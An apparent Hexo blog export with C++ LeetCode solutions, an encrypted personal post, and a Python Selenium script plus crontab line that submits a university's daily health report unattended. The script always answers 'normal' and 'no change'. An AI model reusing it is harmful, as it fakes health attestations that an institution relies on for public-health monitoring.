<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [1,0,0,1,0,0,1,1,1,0,0,0,0,0,0]</span><br><span class="line">输出：18880</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [0,0]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>链表不为空。</li>
<li>链表的结点总数不超过 <code>30</code>。</li>
<li>每个结点的值不是 <code>0</code> 就是 <code>1</code>。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>把链表的每个结点的值存到vector容器tmp中，然后遍历tmp容器计算每一位转十进制的数值并相加。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败49.61%，内存消耗8.7M，击败5.10%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getDecimalValue</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//把链表结点的值存到tmp中</span></span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            tmp.push_back(head-&gt;val);</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> n=tmp.size();</span><br><span class="line">        <span class="comment">//遍历二进制整数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            result+=tmp[i]*<span class="built_in">pow</span>(<span class="number">2</span>,n-i<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/convert-binary-number-in-a-linked-list-to-integer/solution/er-jin-zhi-lian-biao-zhuan-zheng-shu-by-leetcode-s/">官方题解</a>:</h6><p><strong>方法一：模拟</strong></p>
<p>由于链表中从高位到低位存放了数字的二进制表示，因此我们可以使用二进制转十进制的方法，在遍历一遍链表的同时得到数字的十进制值。</p>
<p><strong>c++代码：</strong>（执行8ms，击败80.33%，内存10.4M，击败5.12%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getDecimalValue</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* cur = head;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            ans = ans * <span class="number">2</span> + cur-&gt;val;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$是链表中的节点个数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我是想复杂了，直接像官方题解那样遍历链表同时得到十进制值就行了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>作息安排</title>
    <url>/2020/11/09/%E4%BD%9C%E6%81%AF%E5%AE%89%E6%8E%92/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="0521b0d14084ca0b3156d61674bb40ebe4bced958f8b494bdef37fbcbc3247b5">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec0c133fbd5fae0ba490bbbfee600d4cf6e3211af33e168be316cc8a810184d47717fd3bcafced7206cedb6a08dda94a9a28dca47f7f84bcee5474d5a220d4c3d14f1d3d0b6abb3dc3315930210f3b6c384ee3b28f11a5b6514f4409ba5983e4cad7047c336c5c10ff033ddb410922cfac6ea393fc064efceb0a8e5132472e6658c0de4af3f9db8d0e5bc7132c26ceadbfa55f8090efead1a8104d95d213d2081161b08ceccc5ffc763f5793917b9a3de10a9ba06d5aadaa0170cd9d60778829f1ef6540544d36d1999944e47822edddc2d155031df4192dba5982809bd2b93d11dbfe0e82e8a369bdc5c6fe4edf20a48ab5a5663a0e75693ce0e7309ef755ebf5b29fb95aac7b5303c3bb02c2c55d5fe1ec356ceffab0c0e6316dc4fde8580966f3172fee9d3797fea52899295883ed3a16243ade8f5a11b7e05d40c913c72c82d56820273ecd6204e652fad2a5d4b0f209d2db750a0e339511ed1b284d58f98ce965c3e2e1d3660e5b6967178bc35d259b738d858c2b9998764fe85143507def6bfc30f764734b8530e70a3e52bd75b90860b9a8e96f3ed731b5d0947adc1b5f6a034af7cac33b1c735bfda7ef6a2bdeb175db444350783e649a717a26753f98d14ed8acb55da05d56ff5e7ab8bbc3b2498b70d5df67675858f69091e71a66b384c14a8e0d987157f508e209959b09952ee340abfcaaec3647781cda4743452099456ae99236dfb0927ffea099d084c77f231253814c086750eac7ed3bce48c7b21a16e81afeadec17f7739578ff2a1a67bd750c193bed6885b04c741a967cd964d9c36cc621ff4793ea420318acec83e311b74051776ae89a1d7aa0e12d1b256a75632513b0171f9864ac574be03701dac3ba1473fd5f8a93665214269456aab82a03be66a1129a6b6ab8cc441eea98feb34a67f993ba733fc34b45cd850742dcc340ea8c422d7b5eee2b7b9b70902dc77d61dcc66d8fe5a2acf1c44567b047c4bf06f6792d201f752c08e4c6c389fab94152796a759b50dbc461c788a116cd7330bb9e852d50842cf8c3d63e376b4ed1ac52865a535bf9371937977c6b09b9a62c839b7bed2463899d36a8b7101a395ff17638c2f1e90a6292280aaf37f459d7ba21f45abd6eaa6392b28b9bb8626a64a6f345b67468ec89f69fbeece9b68282b1d5de9c64d7492b72d6b38b5aa1b85d2b335a703bf11e0bf208906fb42814aad3afcac77071a4b4cf915fd35d0231183196b788da0c89d4e673555cd47c6f7fb25f2b1fe48144df3f1de6c4750080b7ced6d7163e5cc38f9855a7d366809b90807c8915c8f1d590ec00af04718ef433565de37e3dd322885e451dfe55d5f687d71d764569fbb36e84be346766ab658de1301b6794f6a7f550a5c0a8a9c377214062c29ba4c23c14978ce410060b585c74cd8c9d90f4ca5e7c46086675aa9b759b7310cdda7e47a4f8fe97645c02935bea1c023c2bea2130fd4af760f97343e70dbdc752cd4a0bb0c66c6af907c32b02950af29945b0ff126b069543d422ee2f04563260e459b8b4a5fda23aad65460b1e318d8511eea10a450a2952077916db47af64e350e5feb3c54b9229b10931d5f6cf70912038365e838e0def65f451f3646fc289e40a42d386a466c16f0ac38ec2b7068daab74a5f989a8af4b49ff6e8fd375e9bcc651d7fc7e15f4fd28eb1</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>健康信息定时上报</title>
    <url>/2020/11/03/%E5%81%A5%E5%BA%B7%E4%BF%A1%E6%81%AF%E5%AE%9A%E6%97%B6%E4%B8%8A%E6%8A%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p>因为前面刚写过<a href="https://z2bns.github.io/2020/10/26/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%AE%89%E5%85%A8%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E7%AD%94%E9%A2%98/">实验室安全考试系统自动答题</a>脚本，而本文的健康信息定时上报也是用到了selenium模块，而且确实是每天都要在系统里上报健康信息，所以写了本文这么一个脚本，仅作为学习技术、学习知识记录之用，请勿滥用。</p>
<a id="more"></a>
<h6 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h6><p>其实也就是用到了python的selenium模块，模拟浏览器登录网站点击按钮实现上报功能，然后把脚本放到服务器上，再设置一个定时任务，每天7点运行一次这个python脚本。其实应该也可以抓上报时的请求包然后分析分析，然后用python定时提交请求，这条路我没试😗</p>
<h6 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- codeing = utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2020/11/03</span></span><br><span class="line"><span class="comment"># @Author : loadding...</span></span><br><span class="line"><span class="comment"># @File : health_report.py</span></span><br><span class="line"><span class="comment"># @Software : jupyter</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver </span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url=<span class="string">&#x27;https://e-report.neu.edu.cn/notes/create&#x27;</span></span><br><span class="line">    <span class="comment">#统一身份认证登录</span></span><br><span class="line">    <span class="comment">#username=input(&#x27;请输入学号：&#x27;)</span></span><br><span class="line">    <span class="comment">#password=input(&#x27;请输入密码：&#x27;)</span></span><br><span class="line">    <span class="comment">#password=getpass.getpass(&#x27;请输入密码：&#x27;)</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">#设置自己的学号、密码，运行时要修改成自己的学号密码</span></span><br><span class="line">    username=<span class="string">&#x27;*******&#x27;</span></span><br><span class="line">    password=<span class="string">&#x27;*************&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#在linux环境下运行，添加以下代码</span></span><br><span class="line">    ch_options=webdriver.ChromeOptions()</span><br><span class="line">    <span class="comment">#为Chrome配置无头模式</span></span><br><span class="line">    ch_options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    ch_options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">    ch_options.add_argument(<span class="string">&quot;--disable-gpu&quot;</span>)</span><br><span class="line">    ch_options.add_argument(<span class="string">&quot;--disable-dev-shm-usage&quot;</span>)</span><br><span class="line">    <span class="comment">#设置之后的</span></span><br><span class="line">    dr=webdriver.Chrome(chrome_options=ch_options)</span><br><span class="line">    dr.get(url)</span><br><span class="line">   	<span class="comment">#设置用户名和密码</span></span><br><span class="line">    dr.find_element_by_id(<span class="string">&#x27;un&#x27;</span>).send_keys(username)</span><br><span class="line">    dr.find_element_by_id(<span class="string">&#x27;pd&#x27;</span>).send_keys(password)</span><br><span class="line">    <span class="comment">#点击提交登录</span></span><br><span class="line">    dr.find_element_by_id(<span class="string">&#x27;index_login_btn&#x27;</span>).click()</span><br><span class="line">    <span class="comment">#根据当前页面url来判断是否登录成功</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;https://pass.neu.edu.cn/tpass/login&#x27;</span> <span class="keyword">in</span> dr.current_url:</span><br><span class="line">        print(<span class="string">&quot;用户名或密码错误！请重新登录！！！&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#点击本人上报</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;app&quot;]/main/div/form/div[1]/table/tbody/tr/td[1]/div/div/div/label[1]/span[1]/span&#x27;</span>).click()</span><br><span class="line">    <span class="comment">#点完本人上报后才会出来无变化这个按钮选项，所以先等1秒，否则容易没等到出来就执行了点击无变化按钮操作，最终导致出错</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#点击正常</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;app&quot;]/main/div/form/div[3]/div[2]/table/tbody/tr[1]/td/div/div/div/label[1]/span[1]/span&#x27;</span>).click()</span><br><span class="line">    <span class="comment">#page_source=dr.page_source</span></span><br><span class="line">    <span class="comment">#tree=etree.HTML(page_source)</span></span><br><span class="line">    <span class="comment">#print(page_source)</span></span><br><span class="line">    <span class="comment">#点击无变化</span></span><br><span class="line">    <span class="comment">#？？？怎么突然好使了，试了好久都是点击不了，我还纳闷呢，giao</span></span><br><span class="line">    <span class="comment">#点击无变化按钮有时好使有时不好使，经测试确实是因为代码执行太快导致没有出现无变化按钮时就已经执行了点击操作，这个坑排了好久，哈哈哈</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;app&quot;]/main/div/form/div[4]/div[2]/table/tbody/tr[1]/td/div/div/div/label[1]/span[1]/span&#x27;</span>).click()</span><br><span class="line">    <span class="comment">#点击提交</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;app&quot;]/main/div/form/div[6]/button&#x27;</span>).click()</span><br><span class="line">    report_time=time.asctime( time.localtime(time.time()) )</span><br><span class="line">    print(report_time+<span class="string">&#x27;：健康上报成功！！！&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h6><p>把本地写好并测试完成后的python脚本放到服务器上，因为使用了selenium模块，所以linux服务器上还需要配置环境（chrome、chromedriver、selenium等），具体参考我的另一篇文章<a href="https://z2bns.github.io/2020/11/03/linux%E4%B8%8B%E4%BD%BF%E7%94%A8selenium%E6%A8%A1%E5%9D%97/">linux下使用selenium模块</a>。</p>
<p>然后再服务器上使用crontab设置定时执行python程序</p>
<p>crontab常用命令：</p>
<ol>
<li>查询当前系统用户设置了哪些执行任务：<code>crontab -l</code></li>
<li>清空当前系统用户设置的所有任务：<code>crontab -r</code>  </li>
<li>编辑和设置当前系统用户要自动执行的任务：<code>crontab -e</code></li>
<li>检查crontab任务执行日志：<code>cat /var/log/cron</code></li>
</ol>
<p>在linux服务器上执行crontab -e，然后在弹出的vim编辑界面最后添加下面这行定时任务（每天早上7点执行health_report.py文件把结果存到report.log文件中）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 7 * * * python3 /home/lighthouse/python_workspace/health_report.py &gt;&gt; /home/lighthouse/python_workspace/report.</span><br><span class="line">log</span><br></pre></td></tr></table></figure>
<p>查看定时任务列表，可以看到定时任务已经添加成功了</p>
<p><img src="/2020/11/03/%E5%81%A5%E5%BA%B7%E4%BF%A1%E6%81%AF%E5%AE%9A%E6%97%B6%E4%B8%8A%E6%8A%A5/image-20201104085221486.png" alt="image-20201104085221486"></p>
<p>经第二天测试，确实是成功自动上报健康信息了🙃</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>selenium</tag>
        <tag>定时任务</tag>
      </tags>
  </entry>
  <entry>
    <title>分割平衡字符串</title>
    <url>/2020/11/10/%E5%88%86%E5%89%B2%E5%B9%B3%E8%A1%A1%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/split-a-string-in-balanced-strings/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>在一个「平衡字符串」中，’L’ 和 ‘R’ 字符的数量是相同的。</p>
<p>给出一个平衡字符串 <code>s</code>，请你将它分割成尽可能多的平衡字符串。</p>
<p>返回可以通过分割得到的平衡字符串的最大数量。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;RLRRLLRLRL&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：s 可以分割为 &quot;RL&quot;, &quot;RRLL&quot;, &quot;RL&quot;, &quot;RL&quot;, 每个子字符串中都包含相同数量的 &#39;L&#39; 和 &#39;R&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;RLLLLRRRLR&quot;</span><br><span class="line">输出：3</span><br><span class="line">解释：s 可以分割为 &quot;RL&quot;, &quot;LLLRRR&quot;, &quot;LR&quot;, 每个子字符串中都包含相同数量的 &#39;L&#39; 和 &#39;R&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;LLLLRRRR&quot;</span><br><span class="line">输出：1</span><br><span class="line">解释：s 只能保持原样 &quot;LLLLRRRR&quot;.</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s[i] = &#39;L&#39; 或 &#39;R&#39;</code></li>
<li>分割得到的每个字符串都必须是平衡字符串。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>利用STL模板库中的栈stack容器，两个字符一个入栈一个出栈，如果栈空（非初始状态）则得到一个平衡字符串</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.4M，击败9.17%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">balancedStringSplit</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; ss;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            <span class="comment">//一个入栈一个出栈</span></span><br><span class="line">            <span class="comment">//栈空或者与栈中字符相同则入栈</span></span><br><span class="line">            <span class="keyword">if</span>(ss.empty() || ss.top()==s[i])&#123;</span><br><span class="line">                ss.push(s[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//与栈中字符不同则出栈</span></span><br><span class="line">                ss.pop();</span><br><span class="line">                <span class="comment">//出栈后栈为空说明是一个平衡字符串（L和R数量相同）</span></span><br><span class="line">                <span class="keyword">if</span>(ss.empty())&#123;</span><br><span class="line">                    ++result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，主要是使用了容器stack的思想，挺好的，散会😪</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>删除中间节点</title>
    <url>/2020/11/07/%E5%88%A0%E9%99%A4%E4%B8%AD%E9%97%B4%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/delete-middle-node-lcci/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>实现一种算法，删除单向链表中间的某个节点（即不是第一个或最后一个节点），假定你只能访问该节点。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：单向链表a-&gt;b-&gt;c-&gt;d-&gt;e-&gt;f中的节点c</span><br><span class="line">结果：不返回任何数据，但该链表变为a-&gt;b-&gt;d-&gt;e-&gt;f</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>依次把删除节点下一个节点的值赋值给当前节点，也就是说把要删除的节点当做下一个节点，这样把要删除节点后面的链元素依次前移。删除节点不是第一个或最后一个节点，处理特殊情况：删除的是倒数第二个节点因为它下一个节点是最后一个节点，依次调用deleteNode函数，若删除节点是倒数第二个，则直接next指针为NULL，否则递归调用deleteNode函数。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败97.21%，内存消耗8.2M，击败5.84%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//删除的节点不为第一个或最后一个节点</span></span><br><span class="line">        <span class="comment">//把要删除的节点变成下一个节点</span></span><br><span class="line">        node-&gt;val=node-&gt;next-&gt;val;</span><br><span class="line">        <span class="comment">//如果是不是倒数第二个节点，递归删除下一个节点</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;next-&gt;next)&#123;</span><br><span class="line">            deleteNode(node-&gt;next);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//是倒数第二个节点，直接删除下一个节点</span></span><br><span class="line">            node-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，效率应该还行，哈哈哈😉!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>删除某些元素后的数组均值</title>
    <url>/2020/11/24/%E5%88%A0%E9%99%A4%E6%9F%90%E4%BA%9B%E5%85%83%E7%B4%A0%E5%90%8E%E7%9A%84%E6%95%B0%E7%BB%84%E5%9D%87%E5%80%BC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/mean-of-array-after-removing-some-elements/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>arr</code> ，请你删除最小 <code>5%</code> 的数字和最大 <code>5%</code> 的数字后，剩余数字的平均值。</p>
<p>与 <strong>标准答案</strong> 误差在 <code>10^-5</code> 的结果都被视为正确结果。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,3]</span><br><span class="line">输出：2.00000</span><br><span class="line">解释：删除数组中最大和最小的元素后，所有元素都等于 2，所以平均值为 2 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [6,2,7,5,1,2,0,3,10,2,5,0,5,5,0,8,7,6,8,0]</span><br><span class="line">输出：4.00000</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [6,0,7,0,7,5,7,8,3,4,0,7,8,1,6,8,1,1,2,4,8,1,9,5,4,3,8,5,10,8,6,6,1,0,6,10,8,2,3,4]</span><br><span class="line">输出：4.77778</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
